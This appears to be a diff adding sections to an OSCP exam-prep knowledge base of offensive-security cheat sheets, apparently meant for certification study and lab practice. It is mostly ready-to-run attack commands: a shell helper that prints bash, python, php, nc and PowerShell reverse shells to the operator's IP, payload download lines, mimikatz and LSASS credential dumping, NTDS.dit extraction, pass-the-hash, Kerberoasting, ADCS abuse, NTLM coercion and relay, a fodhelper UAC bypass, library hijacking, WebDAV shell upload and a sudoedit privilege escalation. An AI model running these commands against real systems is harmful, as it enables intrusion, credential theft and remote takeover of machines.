+addhost(){ grep -q &quot;$2&quot; /etc/hosts || echo &quot;$1 $2&quot; | sudo tee -a /etc/hosts; }   # addhost &lt;ip&gt; &lt;hostname&gt;
+shell(){    # shell &lt;bash|sh|nc|python|php|perl|ps|msf-exe&gt; [port] → print a reverse shell with YOUR $IP filled in
+  local p=${2:-443}; case &quot;$1&quot; in
+    bash) echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/$IP/$p 0&gt;&amp;1&#x27;&quot;;;
+    python) echo &quot;python3 -c &#x27;import socket,os,pty;s=socket.socket();s.connect((\&quot;$IP\&quot;,$p));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\&quot;/bin/bash\&quot;)&#x27;&quot;;;
+    php) echo &quot;php -r &#x27;\$s=fsockopen(\&quot;$IP\&quot;,$p);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#x27;&quot;;;
+    nc) echo &quot;nc $IP $p -e /bin/bash   # win: nc.exe $IP $p -e cmd.exe&quot;;;
+    ps) echo &quot;powershell -e \$(printf &#x27;%s&#x27; \&quot;...TCPClient(&#x27;$IP&#x27;,$p)...\&quot; | iconv -t UTF-16LE|base64 -w0)   # (full one-liner in oscp.sh)&quot;;;
+    msf-exe) echo &quot;msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$p -f exe -o rev.exe&quot;;;
+    *) echo &quot;usage: shell &lt;bash|python|php|nc|ps|msf-exe&gt; [port]  (URL-encode for web!)&quot;;; esac; }
+transfer(){  # transfer &lt;file&gt; → print how a target pulls &lt;file&gt; from your Kali (&#x27;serve&#x27; the dir first)
+  echo &quot;# Linux:  wget http://$IP/$1 -O /tmp/$1  ||  curl http://$IP/$1 -o /tmp/$1&quot;
+  echo &quot;# Windows: certutil -urlcache -split -f http://$IP/$1 $1   ||   powershell iwr http://$IP/$1 -OutFile $1&quot;; }
+alias serve=&#x27;python3 -m http.server 80&#x27;                       # serve current dir to targets
+alias smbserve=&#x27;impacket-smbserver share $(pwd) -smb2support&#x27; # SMB drop for Windows
+alias listen=&#x27;nc -lvnp 443&#x27;                                    # reverse-shell listener
+alias tun=&#x27;ip -o -4 addr show tun0 | awk &quot;{print \$4}&quot;&#x27;        # show your VPN IP
+echo &quot;[+] oscp helpers loaded: ws · enum · spray · hosts · flags · addhost · shell · transfer · serve · smbserve · listen · tun&quot;</code></pre>
+<h2 id="v0-[exam-scripts-use]-the-whole-exam-in-tiny-commands">[EXAM-SCRIPTS-USE]  the whole exam, in tiny commands<a class="anchor" href="#v0-[exam-scripts-use]-the-whole-exam-in-tiny-commands">#</a></h2>
+<pre><code>source ~/oscp.sh                 # once, at start (sets $IP = your tun0)
+ws web1 10.10.10.5               # new box → workspace + $T set
+enum $T                          # auto full-scan + service scan + web/smb fan-out (read scans/, probe manually meanwhile)
+# ...found a credential &#x27;bob:Summer2025!&#x27; ...
+spray bob &#x27;Summer2025!&#x27; $T       # does it work on smb/winrm/ldap/mssql/rdp/ssh here?
+spray bob &#x27;Summer2025!&#x27; hosts.txt   # ...and on every other host?
+serve                            # (in a spare tab) host linpeas etc.
+listen                           # (in a spare tab) catch your shell
+shell bash                       # print a bash reverse shell with your $IP filled in (paste into RCE)
+shell ps 443                     # print a base64 PowerShell reverse shell for a Windows target
+transfer linpeas.sh              # print the wget/certutil line to pull a file onto the target
+flags                            # ON a shell → hunt the flag / creds</code></pre>
+<p><strong>Windows-side loot (paste in a PS shell):</strong></p>
+<pre><code>Get-ChildItem C:\ -Recurse -Force -EA SilentlyContinue -Include *flag*,*.kdbx,*.config | Select FullName
+Select-String -Path C:\Users\*\* -Pattern &#x27;OS\{|flag|password&#x27; -List -EA SilentlyContinue</code></pre>
+<h2 id="v0-[exam-scripts-filemap]-where-everything-lives-on-your-kali">[EXAM-SCRIPTS-FILEMAP]  where everything lives (on your Kali)<a class="anchor" href="#v0-[exam-scripts-filemap]-where-everything-lives-on-your-kali">#</a></h2>
+<pre><code>~/oscp.sh                     the helper functions → source ~/oscp.sh once at start
+~/tools/{linux,windows}/      binaries you push to targets (linpeas, winpeas, chisel, ligolo, potatoes, mimikatz)
+~/oscp/&lt;box&gt;/scans/           auto-created by `ws`/`enum` → nmap + service output
+~/oscp/&lt;box&gt;/{loot,exploits,www}/   creds/keys · exploit code · files to serve
+~/oscp/session-YYYY-MM-DD.log  your command log (started by `script`) → for the report
+/usr/share/wordlists/rockyou.txt · /usr/share/seclists/ · /usr/share/webshells/   Kali-provided</code></pre>
+<p><strong>What to automate:</strong> ✅ setup · enumeration · cred validation/spray · host discovery · local-enum (peas) · BloodHound collect · workflow glue (shell/transfer/serve). ⛔ NEVER automate *exploitation* (sqlmap/autopwn/Armitage), mass scanners (Nessus/OpenVAS), or AI-solving. <strong>Rule: automate up to &quot;vuln identified&quot; → exploit manually.</strong></p>
+<h2 id="v0-[exam-scripts-community]-ready-made-enum-tools-allowed-background-them">[EXAM-SCRIPTS-COMMUNITY]  ready-made enum tools (allowed — background them)<a class="anchor" href="#v0-[exam-scripts-community]-ready-made-enum-tools-allowed-background-them">#</a></h2>
+<pre><code>autorecon $T                      # multi-threaded auto-enum, no exploitation → github.com/Tib3rius/AutoRecon
+nmapAutomator.sh -H $T -t All     # staged enum → github.com/21y4d/nmapAutomator</code></pre>
+<blockquote>Run these in a spare tab <strong>while you manually attack</strong> 80/443/445 — they organize the busy-work; they don&#x27;t find the path for you. Never wait on them, never rely on them blindly.</blockquote>
+<hr>
+<h1 id="v0-[addendum-parity]-extra-tools-from-popular-public-cheatsheets-parity-pass">[ADDENDUM-PARITY]  extra tools from popular public cheatsheets (parity pass)<a class="anchor" href="#v0-[addendum-parity]-extra-tools-from-popular-public-cheatsheets-parity-pass">#</a></h1>
+<blockquote>Cross-checked against widely-used community notes (e.g. saisathvik1&#x27;s). These fill the last gaps. Most are <strong>alternatives</strong> to tools you already have — know they exist; you don&#x27;t need all of them.</blockquote>
+<h2 id="v0-[parity-enum]-alternative-enumerators">[PARITY-ENUM]  alternative enumerators<a class="anchor" href="#v0-[parity-enum]-alternative-enumerators">#</a></h2>
+<pre><code>dirsearch -u http://$T -e php,txt,html        # web dir brute (alt to feroxbuster/ffuf/gobuster)
+dnsenum $DOMAIN                                # DNS enum (alt to dnsrecon); dnsenum --dnsserver $DC $DOMAIN
+impacket-services $DOMAIN/U:P@$T list          # enumerate/Start/Stop Windows services remotely
+joomscan --url http://$T                       # Joomla (alt to droopescan joomla)
+# NOTE: passive-OSINT tools (whois, Shodan, Netcraft, Google-dorking, gitleaks) are for
+# real-world/course recon — NOT used on OSCP exam targets (you&#x27;re given IPs). Skip them for the exam.</code></pre>
+<h2 id="v0-[parity-win-enum]-alternative-windows-privesc-enumerators-pick-one-if-winpeas-is-blocked">[PARITY-WIN-ENUM]  alternative Windows privesc enumerators (pick one if winPEAS is blocked)<a class="anchor" href="#v0-[parity-win-enum]-alternative-windows-privesc-enumerators-pick-one-if-winpeas-is-blocked">#</a></h2>
+<pre><code>powershell -ep bypass -c &quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck&quot;   # PrivescCheck.ps1
+.\jaws-enum.ps1 -OutputFilename jaws.txt                                 # JAWS
+# plus already-covered: winPEAS, PowerUp (Invoke-AllChecks), Seatbelt, accesschk
+icacls &quot;C:\path\to\file_or_dir&quot;        # check NTFS permissions (who can write) — key for service/binary hijack
+icacls &quot;C:\Program Files\svc\bin.exe&quot;  # (F)=full,(M)=modify,(W)=write → writable by you = privesc
+tasklist /v                            # running processes + owners (find privileged procs)
+tasklist /svc                          # map processes → services
+Test-NetConnection -ComputerName $T -Port 445    # test a port from a Windows host (pivot recon, no nmap)
+PsLoggedon.exe \\$T                    # who is logged on where (pick lateral-movement targets)</code></pre>
+<h2 id="v0-[parity-lin-enum]-alternative-linux-privesc-enumerators-if-linpeas-unavailable">[PARITY-LIN-ENUM]  alternative Linux privesc enumerators (if linpeas unavailable)<a class="anchor" href="#v0-[parity-lin-enum]-alternative-linux-privesc-enumerators-if-linpeas-unavailable">#</a></h2>
+<pre><code>./LinEnum.sh -t                 # thorough
+./linuxprivchecker.py           # classic
+./unix-privesc-check standard   # older but useful
+# already covered: linpeas.sh, pspy, manual [LINUX-PRIVESC-MANUAL]</code></pre>
+<h2 id="v0-[parity-potato]-seimpersonate-system-full-variant-list-try-in-this-order">[PARITY-POTATO]  SeImpersonate → SYSTEM, full variant list (try in this order)<a class="anchor" href="#v0-[parity-potato]-seimpersonate-system-full-variant-list-try-in-this-order">#</a></h2>
+<pre><code>PrintSpoofer64.exe -i -c cmd        # modern default, works 2016–2022
+GodPotato-NET4.exe -cmd &quot;cmd /c whoami&quot;
+JuicyPotatoNG.exe -t * -p cmd.exe   # when the above fail
+RoguePotato.exe -r $IP -e &quot;cmd.exe&quot; -l 9999
+SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a &quot;/c whoami&quot;   # EFSRPC variant
+# concept: all abuse SeImpersonate/SeAssignPrimaryToken to steal SYSTEM token. If one fails, try the next.</code></pre>
+<h2 id="v0-[parity-ad-rubeus]-rubeus-windows-side-kerberos-alt-to-impacket-when-you-have-a-windows-shell">[PARITY-AD-RUBEUS]  Rubeus (Windows-side Kerberos — alt to impacket when you have a Windows shell)<a class="anchor" href="#v0-[parity-ad-rubeus]-rubeus-windows-side-kerberos-alt-to-impacket-when-you-have-a-windows-shell">#</a></h2>
+<pre><code>Rubeus.exe kerberoast /outfile:tgs.txt              # Kerberoast → crack -m 13100
+Rubeus.exe asreproast /format:hashcat /outfile:ar.txt   # AS-REP roast → -m 18200
+Rubeus.exe dump                                     # dump tickets in memory
+Rubeus.exe asktgt /user:U /rc4:&lt;ntlm&gt; /ptt          # overpass-the-hash (hash → TGT → inject)
+Rubeus.exe s4u /user:svc /rc4:&lt;hash&gt; /impersonateuser:administrator /msdsspn:cifs/host /ptt  # constrained deleg
+# ticket use (Pass-the-Ticket): Rubeus.exe ptt /ticket:&lt;b64-or-kirbi&gt;</code></pre>
+<h2 id="v0-[parity-ntds]-extract-ntdsdit-on-a-dc-sebackup-local-admin-on-dc-all-domain-hashes">[PARITY-NTDS]  extract NTDS.dit on a DC (SeBackup / local admin on DC) → all domain hashes<a class="anchor" href="#v0-[parity-ntds]-extract-ntdsdit-on-a-dc-sebackup-local-admin-on-dc-all-domain-hashes">#</a></h2>
+<pre><code># method 1 - VSS snapshot (vssadmin/diskshadow), then copy NTDS.dit + SYSTEM:
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\Temp\
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+# method 2 - diskshadow script (SeBackup):  diskshadow /s script.txt   (expose+copy)
+# method 3 - impacket over the network (needs DCSync rights):
+impacket-secretsdump -just-dc $DOMAIN/U:P@$DC
+# then offline:
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</code></pre>
+<h2 id="v0-[parity-pth-extra]-pass-the-hash-tool-variants">[PARITY-PTH-EXTRA]  pass-the-hash tool variants<a class="anchor" href="#v0-[parity-pth-extra]-pass-the-hash-tool-variants">#</a></h2>
+<pre><code>pth-winexe -U &#x27;DOMAIN/user%LMHASH:NTHASH&#x27; //$T cmd.exe    # classic PtH shell
+# already covered: nxc -H, evil-winrm -H, impacket-psexec/wmiexec -hashes :NT</code></pre>
+<h2 id="v0-[parity-ad-report]-ad-reporting-optional-deeper-analysis">[PARITY-AD-REPORT]  AD reporting (optional, deeper analysis)<a class="anchor" href="#v0-[parity-ad-report]-ad-reporting-optional-deeper-analysis">#</a></h2>
+<pre><code># PlumHound / PingCastle = generate AD posture reports from BloodHound/AD data.
+# Nice-to-have for study; on the exam BloodHound (Vol 5 [AD-BLOODHOUND]) is enough.</code></pre>
+<hr>
+<h1 id="v0-[addendum-parity-2]-broader-sweep-0xsyr0oscp-ad-cheatsheets">[ADDENDUM-PARITY-2]  broader sweep (0xsyr0/OSCP + AD cheatsheets)<a class="anchor" href="#v0-[addendum-parity-2]-broader-sweep-0xsyr0oscp-ad-cheatsheets">#</a></h1>
+<blockquote>Cross-checked against more large community repos. Added the <strong>exam-relevant</strong> items only. Skipped OSEP/CRTP-level tradecraft (Skeleton Key, custom SSP/mimilib, SID-History, Forest-Trust tickets, PrivExchange, DSRM) — *not* on OSCP; don&#x27;t study them for this exam.</blockquote>
+<h2 id="v0-[ad-adcs]-active-directory-certificate-services-abuse-certipy-increasingly-oscp-relevant">[AD-ADCS]  Active Directory Certificate Services abuse (Certipy) — increasingly OSCP-relevant<a class="anchor" href="#v0-[ad-adcs]-active-directory-certificate-services-abuse-certipy-increasingly-oscp-relevant">#</a></h2>
+<p><strong>WHAT:</strong> misconfigured certificate templates let a normal user enroll a cert <strong>as</strong> a privileged user → get their NT hash/TGT. Attack IDs <strong>ESC1–ESC8</strong>.</p>
+<pre><code>certipy find -u U@$DOMAIN -p P -dc-ip $DC -vulnerable -stdout    # find vulnerable templates
+# ESC1 (template allows requester-supplied SAN): request a cert as admin
+certipy req -u U@$DOMAIN -p P -ca &lt;CA-NAME&gt; -template &lt;TMPL&gt; -upn administrator@$DOMAIN
+certipy auth -pfx administrator.pfx -dc-ip $DC                    # → NT hash + TGT for admin
+# ESC8 (web enrollment + relay): coerce a DC → ntlmrelayx to http://CA/certsrv → DC cert → DCSync</code></pre>
+<p>Tools: <strong>Certipy</strong> (Linux), <strong>Certify.exe</strong> + <strong>Rubeus</strong> (Windows), <strong>PassTheCert</strong>. Cross-ref <code class="tag">[CVE-HITS]</code> ADCS.</p>
+<h2 id="v0-[parity2-cred-dump]-credential-dumping-the-full-toolbox">[PARITY2-CRED-DUMP]  credential dumping — the full toolbox<a class="anchor" href="#v0-[parity2-cred-dump]-credential-dumping-the-full-toolbox">#</a></h2>
+<pre><code># mimikatz (Windows, admin):
+  privilege::debug
+  sekurlsa::logonpasswords          # plaintext/NTLM from LSASS
+  sekurlsa::ekeys                    # Kerberos keys
+  sekurlsa::tickets /export          # export TGT/TGS
+  lsadump::sam                       # local SAM hashes
+  lsadump::secrets                   # LSA secrets (service creds)
+  lsadump::dcsync /user:$DOMAIN\krbtgt   # DCSync a user
+# no mimikatz on the box? dump LSASS then parse offline:
+  # dump:  procdump -ma lsass.exe lsass.dmp   OR  rundll32 comsvcs.dll,MiniDump &lt;pid&gt; lsass.dmp full
+  pypykatz lsa minidump lsass.dmp    # parse the dump on Kali
+# remote (from Kali, with admin creds):
+  lsassy -u U -p P -d $DOMAIN &lt;hosts&gt;      # remote LSASS dump+parse
+  nxc smb &lt;hosts&gt; -u U -p P --lsa --sam    # LSA + SAM via netexec
+# app/browser creds on a Windows box:
+  LaZagne.exe all                    # dumps browsers, wifi, apps, etc.</code></pre>
+<h2 id="v0-[parity2-coerce]-auth-coercion-relay-for-delegationadcs-paths">[PARITY2-COERCE]  auth coercion + relay (for delegation/ADCS paths)<a class="anchor" href="#v0-[parity2-coerce]-auth-coercion-relay-for-delegationadcs-paths">#</a></h2>
+<pre><code>petitpotam.py -u U -p P &lt;listener-ip&gt; $DC        # coerce DC to auth to you
+printerbug.py $DOMAIN/U:P@$DC &lt;listener-ip&gt;       # MS-RPRN &quot;printer bug&quot;
+coercer coerce -u U -p P -t $DC -l &lt;listener-ip&gt;  # multi-method coercion
+# relay the coerced auth:
+impacket-ntlmrelayx -t ldaps://$DC --delegate-access      # RBCD, or
+impacket-ntlmrelayx -t http://&lt;CA&gt;/certsrv/certfnsh.asp --adcs  # ESC8 → DC cert
+mitm6 -d $DOMAIN                                   # IPv6 DNS takeover (pair with ntlmrelayx -6)</code></pre>
+<h2 id="v0-[parity2-dnsadmins]-dnsadmins-group-system-on-the-dc">[PARITY2-DNSADMINS]  DNSAdmins group → SYSTEM on the DC<a class="anchor" href="#v0-[parity2-dnsadmins]-dnsadmins-group-system-on-the-dc">#</a></h2>
+<pre><code># if your user is in DNSAdmins, load a malicious DLL as the DNS service (SYSTEM):
+dnscmd $DC /config /serverlevelplugindll \\$IP\share\evil.dll
+sc \\$DC stop dns &amp; sc \\$DC start dns            # DLL executes as SYSTEM on the DC
+# build DLL:  msfvenom -p windows/x64/exec CMD=&#x27;...&#x27; -f dll  (or a custom add-user DLL)</code></pre>
+<p>Related: <strong>Backup Operators</strong> membership → back up SAM/SYSTEM/NTDS (<code>diskshadow</code>/<code>reg save</code>) → dump hashes (see <code class="tag">[PARITY-NTDS]</code>).</p>
+<h2 id="v0-[parity2-mssql]-mssql-deeper-powerupsql-linked-servers">[PARITY2-MSSQL]  MSSQL deeper (PowerUpSQL + linked servers)<a class="anchor" href="#v0-[parity2-mssql]-mssql-deeper-powerupsql-linked-servers">#</a></h2>
+<pre><code># PowerUpSQL (Windows):
+Get-SQLInstanceDomain ; Get-SQLServerInfo -Instance &lt;srv&gt;
+Get-SQLServerLinkCrawl -Instance &lt;srv&gt; -Query &#x27;exec master..xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;
+# manual linked-server RCE (execute on a trusted linked box):
+EXEC (&#x27;sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;reconfigure;exec xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;) AT [LINKEDSRV]
+# from Kali:  impacket-mssqlclient $DOMAIN/U:P@$T -windows-auth   → enable_xp_cmdshell; xp_cmdshell whoami</code></pre>
+<h2 id="v0-[parity2-shells-pivot]-windows-side-transferpivot-extras">[PARITY2-SHELLS-PIVOT]  Windows-side transfer/pivot extras<a class="anchor" href="#v0-[parity2-shells-pivot]-windows-side-transferpivot-extras">#</a></h2>
+<pre><code># Powercat (PowerShell netcat): reverse shell / file transfer
+powercat -c $IP -p 443 -e cmd.exe            # reverse   | -l -p 443 -e cmd.exe = bind
+# RunasCs (run as another user from a non-interactive shell — huge when you have creds but no RDP/WinRM):
+RunasCs.exe &lt;user&gt; &lt;pass&gt; &quot;cmd /c whoami&quot; -r $IP:443      # -r = reverse connect
+# FullPowers (restore stripped privileges for a service account → regain SeImpersonate):
+FullPowers.exe
+# Windows port forwarding without chisel:
+netsh interface portproxy add v4tov4 listenport=8080 connectaddress=&lt;internal-ip&gt; connectport=80
+plink.exe -R 3389:127.0.0.1:3389 $USER@$IP    # SSH remote-forward from Windows (plink)
+socat TCP-LISTEN:8080,fork TCP:&lt;internal&gt;:80  # simple relay (Linux pivot)</code></pre>
+<h2 id="v0-[parity2-web-extra]">[PARITY2-WEB-EXTRA]<a class="anchor" href="#v0-[parity2-web-extra]">#</a></h2>
+<pre><code>phpggc Monolog/RCE1 system &#x27;id&#x27; -b            # generate PHP deserialization payload (gadget chains)
+python3 jwt_tool.py &lt;JWT&gt; -T                    # interactively tamper/forge a JWT (alg confusion, etc.)
+python3 ntlm_theft.py -g all -s $IP -f doc      # generate malicious files (.lnk/.scf/.xml…) to capture NetNTLM
+gittools / git-dumper                           # dump exposed .git → source + secrets</code></pre>
+<h2 id="v0-[parity2-wordlist-brute]">[PARITY2-WORDLIST-BRUTE]<a class="anchor" href="#v0-[parity2-wordlist-brute]">#</a></h2>
+<pre><code>cewl -d 2 -m 5 -w words.txt http://$T          # scrape the site into a custom wordlist
+crunch 6 8 -t @@@@%%% -o w.txt                  # generate patterned candidates
+medusa -h $T -u U -P rockyou.txt -M ssh         # brute alt to hydra
+# kernel-exploit suggesters:
+#   Windows: wesng / windows-exploit-suggester / Watson / Sherlock (from `systeminfo`)
+#   Linux:   linux-exploit-suggester (LES) / linux-exploit-suggester2 (from `uname -a`)</code></pre>
+<h2 id="v0-[parity2-enum-extra]">[PARITY2-ENUM-EXTRA]<a class="anchor" href="#v0-[parity2-enum-extra]">#</a></h2>
+<pre><code>masscan -p1-65535 $T --rate 1000 -oL masscan.txt   # very fast port sweep (ALWAYS re-verify with nmap -sCV)
+nmblookup -A $T                                     # NetBIOS names (alt SMB recon)
+# AD enum alternatives to PowerView: SharpView.exe, AdFind.exe, ADExplorer, adidnsdump, ldapdomaindump</code></pre>
+<hr>
+<h1 id="v0-[gap-fill-final]-self-audit-gap-fills-things-every-oscp-toolkit-should-have">[GAP-FILL-FINAL]  self-audit gap fills (things every OSCP toolkit should have)<a class="anchor" href="#v0-[gap-fill-final]-self-audit-gap-fills-things-every-oscp-toolkit-should-have">#</a></h1>
+<h2 id="v0-[ad-doublehop]-the-double-hop-problem-bites-everyone-in-ad">[AD-DOUBLEHOP]  the &quot;double hop&quot; problem (bites everyone in AD)<a class="anchor" href="#v0-[ad-doublehop]-the-double-hop-problem-bites-everyone-in-ad">#</a></h2>
+<pre><code>SYMPTOM: your evil-winrm / WinRM / PSRemoting shell works, but FROM it you can&#x27;t reach a THIRD
+         host or a network share (Access Denied / &quot;no creds&quot;) — your creds don&#x27;t forward past hop 1.
+WHY: NTLM/WinRM doesn&#x27;t delegate your credential to the next hop.
+FIXES (pick one):
+ - Work from YOUR Kali through a pivot instead, passing creds directly ([PIVOT-QUICK] + nxc/impacket -u/-p or -H)
+ - Kerberos ticket: getTGT.py $DOMAIN/U:P → export KRB5CCNAME=U.ccache → tools with -k -no-pass
+ - Pass creds explicitly each command:
+     $p=ConvertTo-SecureString &#x27;PASS&#x27; -AsPlainText -Force
+     $c=New-Object System.Management.Automation.PSCredential(&#x27;DOMAIN\U&#x27;,$p)
+     Invoke-Command -ComputerName host2 -Credential $c -ScriptBlock { whoami }
+ - Get a full interactive session on the box (RDP / RunasCs) so creds are present, then act locally</code></pre>
+<h2 id="v0-[ad-laps-gmsa]-read-managed-passwords-when-you-have-the-rights">[AD-LAPS-GMSA]  read managed passwords (when you have the rights)<a class="anchor" href="#v0-[ad-laps-gmsa]-read-managed-passwords-when-you-have-the-rights">#</a></h2>
+<pre><code># LAPS (randomized local-admin password stored in AD; some users/groups can read it):
+netexec ldap $DC -u U -p P -M laps                 # dump LAPS passwords you can read
+netexec smb  $T  -u U -p P --laps                   # or authenticate using LAPS pw
+ldapsearch -x -H ldap://$DC -D &#x27;U@$DOMAIN&#x27; -w P -b &quot;dc=..,dc=..&quot; &quot;(ms-Mcs-AdmPwd=*)&quot; ms-Mcs-AdmPwd
+# gMSA (group Managed Service Account; readable by authorized principals):
+python3 gMSADumper.py -u U -p P -d $DOMAIN           # → gMSA NT hash → PtH
+netexec ldap $DC -u U -p P --gmsa</code></pre>
+<h2 id="v0-[win-uac-bypass]-medium-integrity-admin-high-integrity-bypass-uac">[WIN-UAC-BYPASS]  medium-integrity admin → high-integrity (bypass UAC)<a class="anchor" href="#v0-[win-uac-bypass]-medium-integrity-admin-high-integrity-bypass-uac">#</a></h2>
+<pre><code># You&#x27;re a LOCAL ADMIN but the shell is medium-integrity (whoami /groups shows no &quot;High Mandatory&quot;).
+# fodhelper:
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /d &quot;C:\Temp\rev.exe&quot; /f
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /v DelegateExecute /f
+start fodhelper.exe                                   # runs your payload high-integrity
+# eventvwr variant: HKCU\Software\Classes\mscfile\shell\open\command → payload, run eventvwr.exe
+# or use the UACME project. Only needed when you must be elevated (e.g., to dump SAM).</code></pre>
+<h2 id="v0-[win-priv-groups]-privileged-groups-systemdc-besides-domainenterprise-admins">[WIN-PRIV-GROUPS]  privileged groups → SYSTEM/DC (besides Domain/Enterprise Admins)<a class="anchor" href="#v0-[win-priv-groups]-privileged-groups-systemdc-besides-domainenterprise-admins">#</a></h2>
+<pre><code>Server Operators  → modify/restart a DC service → sc config &lt;svc&gt; binPath= &quot;...&quot; → SYSTEM on DC
+Backup Operators  → back up SAM/SYSTEM/NTDS → dump hashes (SeBackup, [PARITY-NTDS])
+DnsAdmins         → load DLL as DNS service → SYSTEM on DC ([PARITY2-DNSADMINS])
+Account Operators → create/modify most users &amp; groups (not protected ones)
+Print Operators   → SeLoadDriverPrivilege → vulnerable-driver exploit
+# check your groups:  whoami /groups   |  net user %username% /domain</code></pre>
+<h2 id="v0-[linux-ld-library]-ld-library-path-shared-lib-hijack-via-sudo">[LINUX-LD-LIBRARY]  LD_LIBRARY_PATH / shared-lib hijack via sudo<a class="anchor" href="#v0-[linux-ld-library]-ld-library-path-shared-lib-hijack-via-sudo">#</a></h2>
+<pre><code># sudo -l shows env_keep+=LD_LIBRARY_PATH (or LD_PRELOAD): hijack a library the allowed binary loads.
+gcc -shared -fPIC -o /tmp/evil.so evil.c            # evil.c defines the function the binary calls (spawns shell)
+sudo LD_LIBRARY_PATH=/tmp &lt;allowed-binary&gt;          # or sudo LD_PRELOAD=/tmp/evil.so &lt;allowed-binary&gt;</code></pre>
+<h2 id="v0-[web-403-bypass]-a-path-returns-403401-try-to-get-in">[WEB-403-BYPASS]  a path returns 403/401 — try to get in<a class="anchor" href="#v0-[web-403-bypass]-a-path-returns-403401-try-to-get-in">#</a></h2>
+<pre><code>paths:   /admin//  /admin/.  /./admin  /admin%20  /admin%09  /admin?  /admin#  /ADMIN  /admin/..;/
+headers: X-Forwarded-For: 127.0.0.1 | X-Original-URL: /admin | X-Rewrite-URL: /admin | Referer: same-site
+methods: swap GET→POST/HEAD/PUT/TRACE ; try HTTP/1.0
+tools:   ffuf with the above; the &quot;bypass-403&quot;/&quot;4-ZERO-3&quot; scripts</code></pre>
+<h2 id="v0-[web-put-webdav]-writable-http-put-webdav-upload-a-shell">[WEB-PUT-WEBDAV]  writable HTTP PUT / WebDAV → upload a shell<a class="anchor" href="#v0-[web-put-webdav]-writable-http-put-webdav-upload-a-shell">#</a></h2>
+<pre><code>nmap -p80 --script http-put --script-args http-put.url=&#x27;/shell.php&#x27;,http-put.file=&#x27;./shell.php&#x27; $T
+curl -X PUT http://$T/shell.php --data-binary @shell.php     # if PUT is allowed → browse it
+davtest -url http://$T/webdav                                 # probe WebDAV (what execs?)
+cadaver http://$T/webdav                                      # interactive: put shell.php / shell.asp
+# WebDAV often has default creds (wampp:xampp) → try, or hydra http-get</code></pre>
+<h2 id="v0-[web-param-mining]">[WEB-PARAM-MINING]<a class="anchor" href="#v0-[web-param-mining]">#</a></h2>
+<pre><code>arjun -u http://$T/page                              # dedicated hidden-parameter discovery
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u &#x27;http://$T/page?FUZZ=1&#x27; --hw 0
+# (ffuf param brute already in [WEB-CONTENT])</code></pre>
+<h2 id="v0-[enum-misc-ports]-less-common-services-worth-a-look">[ENUM-MISC-PORTS]  less-common services worth a look<a class="anchor" href="#v0-[enum-misc-ports]-less-common-services-worth-a-look">#</a></h2>
+<pre><code>23   Telnet    → telnet $T 23 ; banner + default/weak creds (often network devices)
+79   finger    → finger root@$T ; finger @$T  (user enumeration on old *nix)
+110/143 POP3/IMAP → nc $T 110 ; try found creds; read mail (creds/loot)
+513/514 rlogin/rsh → rlogin -l root $T (legacy trust relationships)
+873  rsync     → rsync $T::            (list modules) ; rsync -av $T::&lt;mod&gt;/ loot/  (pull, often anon)
+2049 NFS       → already [ENUM-NFS]
+5900 VNC       → vncviewer $T ; nmap --script vnc-info,realvnc-auth-bypass -p5900 $T ; hydra vnc
+9200 Elastic   → curl $T:9200/_cat/indices ; CVE-2015-1427 (old) [CVE-HITS]</code></pre>
+<h2 id="v0-[shell-revshells]-generator-bookmark">[SHELL-REVSHELLS]  generator bookmark<a class="anchor" href="#v0-[shell-revshells]-generator-bookmark">#</a></h2>
+<pre><code># https://www.revshells.com — builds any reverse shell (bash/python/php/powershell/nc/…) with your
+# IP+port pre-filled, incl. URL-encoded + msfvenom variants. Keep an OFFLINE copy for exam day.
+# (Core one-liners are already in [SHELL-QUICK]; this is the &quot;under pressure, just copy it&quot; fallback.)</code></pre>
+<hr>
+<h1 id="v0-[addendum-parity-3]-deep-mine-additions-0xsyr0oscp-sweep">[ADDENDUM-PARITY-3]  deep-mine additions (0xsyr0/OSCP sweep)<a class="anchor" href="#v0-[addendum-parity-3]-deep-mine-additions-0xsyr0oscp-sweep">#</a></h1>
+<blockquote>Systematic extraction from the deepest single-file community cheatsheet. These are the genuine gaps it had that this KB didn&#x27;t.</blockquote>
+<h2 id="v0-[parity3-install]-installsetup-commands-that-were-missing">[PARITY3-INSTALL]  install/setup commands that were missing<a class="anchor" href="#v0-[parity3-install]-installsetup-commands-that-were-missing">#</a></h2>
+<pre><code>sudo apt install -y krb5-user                 # Kerberos client (kinit, klist) for ccache/AD ticket workflow
+sudo apt install -y mingw-w64 gcc-multilib    # cross-compile Win exe + build 32-bit Linux (also in [KALI-SETUP])
+git clone https://github.com/ropnop/impacket_static_binaries   # precompiled impacket to DROP ON a target (no python needed)
+# run a python exploit that has dependencies, cleanly:
+python3 -m venv venv &amp;&amp; source venv/bin/activate &amp;&amp; pip install -r requirements.txt</code></pre>
+<h2 id="v0-[parity3-sudoedit]-cve-2023-22809-sudoedit-arbitrary-file-write-root">[PARITY3-SUDOEDIT]  CVE-2023-22809 — sudoedit arbitrary file write → root<a class="anchor" href="#v0-[parity3-sudoedit]-cve-2023-22809-sudoedit-arbitrary-file-write-root">#</a></h2>
+<pre><code># If `sudo -l` allows sudoedit (or a *edit rule) and sudo is 1.8.0–1.9.12p1:
+# the EDITOR var accepts an extra file via &quot;--&quot;, letting you edit ANY root-owned file.
+EDITOR=&quot;vim -- /etc/passwd&quot;  sudoedit /path/to/allowed/file   # then add a root user line → su
+# (companions already in [LINUX-SUDO]: CVE-2019-14287 `sudo -u#-1`, CVE-2021-3156 Baron Samedit)</code></pre>
